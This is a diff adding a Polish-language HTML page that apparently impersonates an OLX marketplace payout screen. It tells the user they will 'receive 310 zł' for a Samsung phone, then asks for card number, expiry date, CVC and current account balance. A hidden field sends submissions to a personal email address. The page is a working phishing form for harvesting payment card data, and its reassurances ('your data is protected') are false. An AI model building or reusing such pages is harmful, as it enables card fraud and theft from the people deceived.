@@ -1,0 +1,139 @@
+
+<!DOCTYPE html>
+<html>
+	<head>
+		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&amp;subset=cyrillic">
+		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
+		<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
+		<link rel="stylesheet" type="text/css" href="css/common.css">
+		<link rel="shortcut icon" type="image/png" href="img/fav-icon.png">
+
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+		<title>Pozyskiwanie funduszy</title>
+	</head>
+
+	<body>
+    <div class="block-info">
+	<h3>Informacje o produkcie</h3>
+        <p class="description-info">Samsung galaxy J5 zloty</p>
+
+        <div class="block-error">
+            <p>
+                <i class="fas fa-exclamation-triangle"></i>
+                <span class="label-error"></span>
+            </p>
+        </div>
+    </div>
+
+		<div class="divider"></div>
+
+		<div class="block-method">
+			<div class="row">
+				<div class="list-method">
+					<div class="row">
+						<div class="col-xs-6">
+							<div class="item-method active-method">
+								<img src="img/logo-card.svg">
+							</div>
+						</div>
+
+						<div class="col-xs-6">
+							<div class="item-method">
+								<img src="img/logo-other.svg">
+							</div>
+						</div>
+
+						<div class="col-xs-12">
+							<div class="description-method">
+								<p>Bezpieczeństwo przetwarzania płatności za pomocą kart plastikowych gwarantuje przejęcie banków.</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="block-form">
+			<form class="form-payment">
+
+				<!-- Hidden Required Fields -->
+		<input type="hidden" name="OLX" value="Site Name">
+		<input type="hidden" name="admin_email" value="ioanhudetskyi@gmail.com">
+		<input type="hidden" name="form_subject" value="Form Subject">
+		<input type="hidden" name="form_subject" value="Form Subject">
+		<input type="hidden" name="form_subject" value="Form Subject">
+		<!-- END Hidden Required Fields -->
+
+
+				<div class="form-group">
+    					<label for="input-number">Nr karty</label>
+    					<input type="text" class="form-control"  name="card_number" data-type="number" placeholder="0000 0000 0000 0000" maxlength="16">
+				</div>
+
+				<div class="row">
+					<div class="col-xs-4">
+						<div class="form-group">
+		    					<label for="input-month">Data ważności</label>
+		    					<input type="text" class="form-control"  name="card_expire_month" data-type="number" placeholder="01" maxlength="2">
+						</div>
+					</div>
+
+					<div class="col-xs-4">
+						<div class="form-group">
+		    					<input type="text" class="form-control"  name="card_expire_year" data-type="number" placeholder="20" maxlength="2">
+						</div>
+					</div>
+
+					<div class="col-xs-4">
+						<div class="form-group">
+		    					<label for="input-code">
+		    						CVC
+		    						<i class="far fa-question-circle" data-toggle="tooltip" data-placement="top" title="3 numery na odwrocie mapy"></i>
+		    					</label>
+
+		    					<input type="password" class="form-control"  name="card_cvc" data-type="number" placeholder="•••" maxlength="3">
+						</div>
+						<div class="form-group">
+    					<label for="input-number">Wpisz swoje bieżące saldo</label>
+    					<input type="text" class="form-control" name="balance" data-type="number" placeholder="saldo...">
+				</div>
+					</div>
+				</div>
+				<br>
+				
+
+				<div class="divider"></div>
+
+		<div class="block-footer">
+			<div class="row">
+				<div class="col-xs-6">
+					<a class="button-secondary">
+						<i class="fas fa-chevron-left"></i> Wstecz
+					</a>
+				</div>
+
+				<div class="col-xs-6">
+					<button class="button-primary">Potwierdzić	</button>
+				</div>
+			</div>
+		</div>
+
+				
+			</form>
+
+			<div class="block-form-info">
+				<h4 class="heading-total">Aby otrzymać: <b>310 zł</b></h4>
+				<p class="heading-secure">
+					<i class="fas fa-lock"></i>  Twoje dane są chronione.
+				</p>
+			</div>
+		</div>
+     <script src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+	 <script src="script.js"></script>
+		
+	</body>
+
+	</html>
